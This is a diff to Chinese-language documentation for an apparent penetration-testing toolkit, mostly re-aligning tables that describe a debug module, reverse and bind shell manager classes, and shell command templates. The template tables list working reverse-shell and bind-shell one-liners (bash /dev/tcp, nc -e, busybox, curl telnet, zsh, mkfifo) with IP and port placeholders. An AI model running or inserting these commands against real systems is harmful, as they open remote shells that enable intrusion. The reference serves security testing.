@@ -452,10 +452,10 @@ result = random_obf("ls /", obf=methods, depth=2)
 
 调试日志模块，核心基础设施：
 
-| 函数 | 说明 |
-|------|------|
-| `set_debug()` | 启用调试模式，设置 `EXP_DEBUG=true` |
-| `set_no_debug()` | 关闭调试模式 |
+| 函数                      | 说明 |
+|-------------------------|------|
+| `set_debug()`           | 启用调试模式，设置 `EXP_DEBUG=true` |
+| `set_no_debug()`        | 关闭调试模式 |
 | `debug_log(msg, tag="")` | 输出调试日志，自动获取调用者函数名和文件名 |
 
 **说明**：`tool.base` 中的 `set_debug()` 和 `debug_log()` 实际代理此模块。
@@ -468,37 +468,37 @@ TCP 反向/绑定 Shell 管理器，用于 RCE 场景下的命令交互：
 
 #### 类
 
-| 类 | 说明 |
-|----|------|
-| `TcpShellR` | 反向 Shell 服务器（监听端口接收连接） |
-| `TcpShellB` | 绑定 Shell 客户端（主动连接目标端口） |
-| `RecvData` | 接收数据记录（timestamp + data） |
+| 类               | 说明 |
+|-----------------|------|
+| `TcpShellR`     | 反向 Shell 服务器（监听端口接收连接） |
+| `TcpShellB`     | 绑定 Shell 客户端（主动连接目标端口） |
+| `RecvData`      | 接收数据记录（timestamp + data） |
 | `TcpShellRError` | 反向 Shell 异常 |
 | `TcpShellBError` | 绑定 Shell 异常 |
 
 #### TcpShellR 接口
 
-| 方法 | 说明 |
-|------|------|
-| `start()` | 启动监听服务器，返回 self |
-| `stop()` | 停止服务器 |
-| `port()` | 获取实际监听端口（需在 start() 后调用） |
-| `is_connected()` | 检查是否有客户端连接 |
-| `send(data: str \| bytes)` | 发送数据 |
-| `sendline(data: str)` | 发送字符串并追加换行符 |
+| 方法                                  | 说明 |
+|-------------------------------------|------|
+| `start()`                           | 启动监听服务器，返回 self |
+| `stop()`                            | 停止服务器 |
+| `port()`                            | 获取实际监听端口（需在 start() 后调用） |
+| `is_connected()`                    | 检查是否有客户端连接 |
+| `send(data: str \| bytes)`          | 发送数据 |
+| `sendline(data: str)`               | 发送字符串并追加换行符 |
 | `output(timeout, idle_ms, encoding)` | 等待数据接收完毕返回（idle_ms 毫秒无新数据则认为结束） |
-| `peek(encoding)` | 查看缓冲区数据（不消费） |
+| `peek(encoding)`                    | 查看缓冲区数据（不消费） |
 
 #### TcpShellB 接口
 
-| 方法 | 说明 |
-|------|------|
-| `connect(host, port)` | 连接到目标 |
-| `disconnect()` | 断开连接 |
-| `wait_connected(timeout)` | 等待连接建立 |
-| `is_connected()` | 检查连接状态 |
-| `interactive()` | 进入交互模式（标准输入/输出转发） |
-| `send(data)` / `sendline(data)` | 同 TcpShellR |
+| 方法                                  | 说明 |
+|-------------------------------------|------|
+| `connect(host, port)`               | 连接到目标 |
+| `disconnect()`                      | 断开连接 |
+| `wait_connected(timeout)`           | 等待连接建立 |
+| `is_connected()`                    | 检查连接状态 |
+| `interactive()`                     | 进入交互模式（标准输入/输出转发） |
+| `send(data)` / `sendline(data)`     | 同 TcpShellR |
 | `output(timeout, idle_ms, encoding)` | 同 TcpShellR |
 
 #### Shell 命令生成
@@ -513,32 +513,32 @@ def gen_shell_b_cmd(name: str, port: int) -> str | None
 
 **反向 Shell 模板**（17 种）：
 
-| 模板名 | 说明 |
-|--------|------|
-| `bash_i` | `bash -i >& /dev/tcp/{ip}/{port} 0>&1` |
-| `bash_196` | `0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196` |
-| `bash_read_line` | `exec 5<>/dev/tcp/{ip}/{port};cat <&5 \| while read line; do $line 2>&5 >&5; done` |
-| `nc_c_bash` | `nc -c bash {ip} {port}` |
-| `nc_c_sh` | `nc -c sh {ip} {port}` |
-| `nc_e_bash` | `nc {ip} {port} -e /bin/bash` |
-| `nc_e_sh` | `nc {ip} {port} -e /bin/sh` |
-| `busybox_nc_e_bash` | `busybox nc {ip} {port} -e /bin/bash` |
-| `busybox_nc_e_sh` | `busybox nc {ip} {port} -e /bin/sh` |
-| `curl_bash` | `C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 \| bash 2>&1 \| $C >/dev/null` |
-| `awk` | `awk 'BEGIN{...}' /dev/null` |
-| `zsh` | `zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` |
-| `python3_bash` | Python3 反向 Shell |
-| `nc_mkfifo_bash` | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|bash -i 2>&1\|nc {ip} {port} >/tmp/f` |
+| 模板名                  | 说明 |
+|----------------------|------|
+| `bash_i`             | `bash -i >& /dev/tcp/{ip}/{port} 0>&1` |
+| `bash_196`           | `0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196` |
+| `bash_read_line`     | `exec 5<>/dev/tcp/{ip}/{port};cat <&5 \| while read line; do $line 2>&5 >&5; done` |
+| `nc_c_bash`          | `nc -c bash {ip} {port}` |
+| `nc_c_sh`            | `nc -c sh {ip} {port}` |
+| `nc_e_bash`          | `nc {ip} {port} -e /bin/bash` |
+| `nc_e_sh`            | `nc {ip} {port} -e /bin/sh` |
+| `busybox_nc_e_bash`  | `busybox nc {ip} {port} -e /bin/bash` |
+| `busybox_nc_e_sh`    | `busybox nc {ip} {port} -e /bin/sh` |
+| `curl_bash`          | `C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 \| bash 2>&1 \| $C >/dev/null` |
+| `awk`                | `awk 'BEGIN{...}' /dev/null` |
+| `zsh`                | `zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` |
+| `python3_bash`       | Python3 反向 Shell |
+| `nc_mkfifo_bash`     | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|bash -i 2>&1\|nc {ip} {port} >/tmp/f` |
 | `openssl_mkfifo_bash` | OpenSSL + mkfifo |
-| `powershell1` | PowerShell 反向 Shell |
+| `powershell1`        | PowerShell 反向 Shell |
 
 **绑定 Shell 模板**（3 种）：
 
-| 模板名 | 说明 |
-|--------|------|
-| `nc_l_bash` | `nc -l -p {port} -e /bin/bash` |
+| 模板名            | 说明 |
+|----------------|------|
+| `nc_l_bash`    | `nc -l -p {port} -e /bin/bash` |
 | `nc_mkfifo_sh` | mkfifo + nc 监听 |
-| `nc_python3` | Python3 绑定 Shell |
+| `python3`      | Python3 绑定 Shell |
 
 #### 使用示例
 
